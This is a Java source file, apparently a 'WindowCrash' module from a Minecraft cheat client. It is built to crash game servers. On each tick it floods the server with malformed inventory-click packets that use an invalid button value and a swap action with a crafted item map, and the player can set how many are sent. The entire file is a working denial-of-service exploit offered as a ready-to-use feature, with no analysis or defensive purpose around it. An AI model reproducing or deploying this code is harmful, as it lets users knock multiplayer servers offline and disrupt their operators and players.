// Ported from AntiCope/meteor-crash-addon (MIT License)
package thunder.hack.features.modules.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import thunder.hack.features.modules.Module;
import thunder.hack.setting.Setting;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;

public class WindowCrash extends Module {
    private final Setting<Integer> amount = new Setting<>("Amount", 6, 2, 12);

    public WindowCrash() {
        super("WindowCrash", Category.CRASH);
    }

    @Override
    public void onUpdate() {
        if (mc.player == null) return;
        ScreenHandler handler = mc.player.currentScreenHandler;
        Int2ObjectArrayMap<ItemStack> itemMap = new Int2ObjectArrayMap<>();
        itemMap.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        for (int i = 0; i < amount.getValue() + 1; i++) {
            mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(handler.syncId, handler.getRevision(), 36, -1, SlotActionType.SWAP, handler.getCursorStack().copy(), itemMap));
        }
    }
}
